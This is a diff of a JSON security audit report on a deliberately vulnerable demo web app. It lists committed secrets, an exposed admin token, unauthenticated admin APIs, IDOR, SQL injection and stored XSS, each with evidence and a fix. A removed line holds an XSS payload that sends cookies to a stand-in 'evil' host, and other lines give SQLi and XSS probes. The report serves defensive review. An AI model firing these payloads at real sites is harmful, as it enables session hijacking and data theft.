@@ -1,90 +1,156 @@
 {
   "grade": "F",
-  "summary": "Six confirmed issues in ./demo-app: committed secrets, a client-exposed admin token, unauthenticated admin APIs, IDOR on notes, SQL injection in search, and stored XSS in note rendering. Immediate remediation required before any production deploy.",
+  "summary": "The demo application fails security review with eight critical and four high-severity issues across committed secrets, unauthenticated admin APIs, client-exposed credentials, SQL injection, IDOR, and stored XSS. Secrets in version control and a hardcoded admin token in the client bundle create immediate account and privilege compromise risk; missing auth on admin routes and weak object-level controls allow unauthenticated data access and destructive actions without valid sessions.",
   "findingCount": {
-    "critical": 2,
-    "high": 3,
-    "medium": 1,
+    "critical": 8,
+    "high": 4,
+    "medium": 0,
     "low": 0
   },
-  "topExploitChain": "Read sk-fake keys from committed demo-app/.env → extract window.__ADMIN_TOKEN from the client bundle → call GET /api/admin unauthenticated → enumerate other users' notes via ?userId= → exfiltrate data using SQLi on /api/search → persist XSS payload in a note rendered by Note.tsx for session hijack.",
+  "topExploitChain": "Clone the repository and harvest API keys, GitHub token, and database credentials from demo-app/.env. Open the app in a browser, read sk-admin-super-secret-token-abc123 from the bundled client code or window.__ADMIN_TOKEN, then call DELETE /api/admin with no authentication to trigger privileged delete behavior. Pivot with GET /api/notes?userId=2 to read another user's notes, and use GET /api/search?q=' OR '1'='1 to probe SQL injection for broader data exfiltration if the search endpoint hits a real database.",
   "demoScript": [
-    "Open the audit UI and review grade F with six findings across secrets, auth, and injection.",
-    "Walk the top exploit chain: secrets → admin token → open admin API → IDOR → SQLi → stored XSS.",
-    "Generate fix PLAN, copy for Cursor, and paste into the demo-app workspace to remediate in one session."
+    "Run the multi-agent security scan against demo-app and present the F grade with twelve merged findings across secrets, auth, and injection specialists.",
+    "Live-walk the top exploit chain: show .env secrets in git, extract the admin token from page source or DevTools, hit unauthenticated GET/DELETE /api/admin, and demonstrate IDOR on /api/notes?userId=2.",
+    "Generate a fix plan, remediate highest-risk items first (rotate secrets, remove client token exposure, add admin auth, parameterize SQL, sanitize note HTML), and re-scan to show grade improvement."
   ],
   "findings": [
     {
-      "id": "VG-001",
-      "title": "Committed .env with live-format API keys and database credentials",
+      "title": "Committed Cursor API key in version control",
       "severity": "critical",
-      "category": "secrets-exposure",
+      "category": "committed-secrets",
       "file": "demo-app/.env",
       "line": 1,
-      "evidence": "CURSOR_API_KEY=sk-fake-demo-key-do-not-use\nOPENAI_API_KEY=sk-fake-openai-key-12345\nGITHUB_TOKEN=ghp_fake_github_token_for_demo",
-      "exploitScenario": "Clone the repo or browse history; attacker harvests keys and connection strings for lateral movement into CI, cloud, and database hosts.",
-      "fixHint": "Remove .env from git, rotate all exposed values, add .env to .gitignore, and load secrets from a vault or deployment env only."
+      "evidence": "CURSOR_API_KEY=sk-fake-demo-key-do-not-use",
+      "exploitScenario": "An attacker cloning the repository or browsing commit history extracts the key and uses it to call Cursor or related APIs as the victim account.",
+      "fixHint": "Remove demo-app/.env from git history, add .env to .gitignore, rotate the key, and inject CURSOR_API_KEY via CI secrets or a vault at deploy time.",
+      "id": "finding-1"
     },
     {
-      "id": "VG-002",
-      "title": "Admin token embedded in client bundle via inline script",
+      "title": "Committed OpenAI API key in version control",
       "severity": "critical",
-      "category": "client-secret-leak",
+      "category": "committed-secrets",
+      "file": "demo-app/.env",
+      "line": 2,
+      "evidence": "OPENAI_API_KEY=sk-fake-openai-key-12345",
+      "exploitScenario": "Anyone with repo access copies the key and runs unauthorized OpenAI requests, incurring cost and accessing models tied to the account.",
+      "fixHint": "Delete the committed .env file, rotate the OpenAI key in the provider console, and load OPENAI_API_KEY only from server-side environment variables.",
+      "id": "finding-2"
+    },
+    {
+      "title": "Committed GitHub personal access token in version control",
+      "severity": "critical",
+      "category": "committed-secrets",
+      "file": "demo-app/.env",
+      "line": 3,
+      "evidence": "GITHUB_TOKEN=ghp_fake_github_token_for_demo",
+      "exploitScenario": "An attacker uses the leaked ghp_ token to read private repos, push malicious code, or exfiltrate organization data depending on token scopes.",
+      "fixHint": "Revoke the GitHub token immediately, remove .env from the repository, and issue a new token stored in GitHub Actions secrets or another secret manager.",
+      "id": "finding-3"
+    },
+    {
+      "title": "Committed database credentials in connection string",
+      "severity": "critical",
+      "category": "committed-secrets",
+      "file": "demo-app/.env",
+      "line": 4,
+      "evidence": "DATABASE_URL=postgres://admin:password123@localhost:5432/app",
+      "exploitScenario": "If the same credentials are reused in staging or production, an attacker with repo access connects directly to PostgreSQL and reads or modifies application data.",
+      "fixHint": "Rotate the database password, remove credentials from git, and supply DATABASE_URL via deployment secrets with least-privilege DB users.",
+      "id": "finding-4"
+    },
+    {
+      "title": "Hardcoded admin token embedded in client bundle",
+      "severity": "critical",
+      "category": "client-bundle-exposure",
+      "file": "demo-app/app/page.tsx",
+      "line": 2,
+      "evidence": "const ADMIN_TOKEN = \"sk-admin-super-secret-token-abc123\";",
+      "exploitScenario": "Because page.tsx is a client component, the token is bundled into JavaScript sent to every browser; an attacker inspects the bundle or DevTools Sources tab and reuses the token against privileged endpoints.",
+      "fixHint": "Remove the hardcoded token, keep admin credentials server-side only, and authenticate admin routes with session cookies or short-lived server-issued tokens never referenced in client code.",
+      "id": "finding-5"
+    },
+    {
+      "title": "Admin token injected into global window object",
+      "severity": "critical",
+      "category": "client-bundle-exposure",
       "file": "demo-app/app/page.tsx",
       "line": 9,
-      "evidence": "const ADMIN_TOKEN = \"sk-admin-super-secret-token-abc123\";\n<script dangerouslySetInnerHTML={{ __html: `window.__ADMIN_TOKEN=\"${ADMIN_TOKEN}\"` }} />",
-      "exploitScenario": "View page source or DevTools; read window.__ADMIN_TOKEN and replay it on privileged routes or admin tooling.",
-      "fixHint": "Never ship admin tokens to the browser; use httpOnly session cookies and server-only env vars for privileged operations."
+      "evidence": "<script dangerouslySetInnerHTML={{ __html: `window.__ADMIN_TOKEN=\"${ADMIN_TOKEN}\"` }} />",
+      "exploitScenario": "Any script on the page or a user in DevTools can read window.__ADMIN_TOKEN and replay it in Authorization headers to call admin APIs without authentication.",
+      "fixHint": "Delete the inline script and window global; never expose secrets via DOM or globals, and proxy privileged actions through authenticated server routes.",
+      "id": "finding-6"
     },
     {
-      "id": "VG-003",
-      "title": "Admin API exposes user list without authentication",
+      "title": "Unauthenticated admin data API",
       "severity": "high",
-      "category": "broken-access-control",
+      "category": "Missing Authentication",
       "file": "demo-app/app/api/admin/route.ts",
-      "line": 3,
-      "evidence": "// VULN: no authentication on admin endpoint\nreturn NextResponse.json({ users: [\"alice\", \"bob\"], role: \"admin\" });",
-      "exploitScenario": "curl GET /api/admin — unauthenticated caller receives admin JSON and can invoke DELETE to wipe data.",
-      "fixHint": "Require session or JWT with admin role on every handler; reject anonymous requests with 401/403."
+      "line": 2,
+      "evidence": "export async function GET() { return NextResponse.json({ users: [\"alice\", \"bob\"], role: \"admin\" }); }",
+      "exploitScenario": "Any unauthenticated client can GET /api/admin and enumerate admin users and confirm admin role metadata without credentials.",
+      "fixHint": "Require server-side session or bearer token validation before returning admin data; restrict route with middleware or shared auth helper that checks admin role.",
+      "id": "finding-7"
     },
     {
-      "id": "VG-004",
-      "title": "IDOR: notes endpoint returns any user's data by userId param",
+      "title": "Unauthenticated admin DELETE endpoint",
+      "severity": "critical",
+      "category": "Missing Authentication",
+      "file": "demo-app/app/api/admin/route.ts",
+      "line": 6,
+      "evidence": "export async function DELETE() { return NextResponse.json({ deleted: true }); }",
+      "exploitScenario": "An attacker sends DELETE /api/admin with no auth and triggers privileged delete behavior intended for administrators only.",
+      "fixHint": "Gate DELETE behind the same admin auth check as other admin mutations; return 401/403 when session or token is missing or not admin.",
+      "id": "finding-8"
+    },
+    {
+      "title": "IDOR via userId query parameter on notes API",
       "severity": "high",
-      "category": "idor",
+      "category": "IDOR",
       "file": "demo-app/app/api/notes/route.ts",
-      "line": 7,
-      "evidence": "const userId = searchParams.get(\"userId\");\n// VULN: IDOR - returns any user's notes without auth\nreturn NextResponse.json({ userId, notes: notes[userId as keyof typeof notes] ?? [] });",
-      "exploitScenario": "Iterate ?userId=1,2,… to read other users' notes without logging in as them.",
-      "fixHint": "Bind notes to the authenticated principal from the session; ignore client-supplied userId for authorization."
+      "line": 4,
+      "evidence": "const userId = searchParams.get(\"userId\"); ... notes[userId as keyof typeof notes]",
+      "exploitScenario": "Attacker calls GET /api/notes?userId=2 (or other IDs) without logging in and reads another user's notes, including sensitive entries such as \"secret note\".",
+      "fixHint": "Derive the active user from the authenticated session server-side; ignore or reject client-supplied userId unless it matches the session subject; enforce object-level authorization on note lookups.",
+      "id": "finding-9"
     },
     {
-      "id": "VG-005",
-      "title": "SQL injection via unsanitized search query concatenation",
+      "title": "Admin token exposed in client bundle",
       "severity": "high",
-      "category": "sql-injection",
-      "file": "demo-app/app/api/search/route.ts",
-      "line": 7,
-      "evidence": "const q = searchParams.get(\"q\") ?? \"\";\nconst query = `SELECT * FROM items WHERE title LIKE '%${q}%'`;",
-      "exploitScenario": "Request /api/search?q=' OR '1'='1 — crafted input breaks out of the LIKE clause for full table read or destructive statements if executed.",
-      "fixHint": "Use parameterized queries / an ORM; never interpolate user input into SQL strings."
+      "category": "Privilege Escalation",
+      "file": "demo-app/app/page.tsx",
+      "line": 9,
+      "evidence": "window.__ADMIN_TOKEN=\"${ADMIN_TOKEN}\" with ADMIN_TOKEN = \"sk-admin-super-secret-token-abc123\"",
+      "exploitScenario": "Anyone can view page source or the shipped JS bundle, read window.__ADMIN_TOKEN, and reuse the static admin credential against protected admin APIs or tooling.",
+      "fixHint": "Remove hardcoded admin secrets from client code; store credentials only server-side; issue short-lived admin tokens after server-side role verification, never embed them in HTML or client bundles.",
+      "id": "finding-10"
     },
     {
-      "id": "VG-006",
-      "title": "Stored XSS via dangerouslySetInnerHTML on note content",
-      "severity": "medium",
-      "category": "xss",
+      "title": "SQL injection via string-concatenated search query",
+      "severity": "critical",
+      "category": "SQL Injection",
+      "file": "demo-app/app/api/search/route.ts",
+      "line": 6,
+      "evidence": "const query = `SELECT * FROM items WHERE title LIKE '%${q}%'`;",
+      "exploitScenario": "An attacker sends GET /api/search?q=' OR '1'='1 to break out of the LIKE clause, or uses UNION/stacked queries to read or modify arbitrary rows if this string is passed to a real database driver.",
+      "fixHint": "Use parameterized queries (prepared statements) with bound placeholders for q; never interpolate user input into SQL strings.",
+      "id": "finding-11"
+    },
+    {
+      "title": "Stored XSS via unsanitized HTML in Note component",
+      "severity": "high",
+      "category": "Stored XSS",
       "file": "demo-app/components/Note.tsx",
       "line": 3,
-      "evidence": "// VULN: renders unsanitized HTML\nreturn <div dangerouslySetInnerHTML={{ __html: content }} />;",
-      "exploitScenario": "Save a note containing <img src=x onerror=fetch('https://evil/?c='+document.cookie)>; victims viewing the note execute attacker script.",
-      "fixHint": "Sanitize HTML with a vetted library, or render plain text only; avoid dangerouslySetInnerHTML for user content."
+      "evidence": "return <div dangerouslySetInnerHTML={{ __html: content }} />;",
+      "exploitScenario": "An attacker stores note content such as <img src=x onerror=alert(document.cookie)> or a script payload; when any user views the note, the browser executes the injected HTML/JS in the app origin.",
+      "fixHint": "Render plain text (escape on output) or sanitize HTML with a strict allowlist (e.g. DOMPurify); avoid dangerouslySetInnerHTML for untrusted content.",
+      "id": "finding-12"
     }
   ],
   "agentContributions": {
-    "secrets-scout": 2,
-    "auth-guard": 2,
+    "secrets-scout": 6,
+    "auth-guard": 4,
     "injection-hunter": 2,
-    "orchestrator": 6
+    "orchestrator": 12
   }
 }
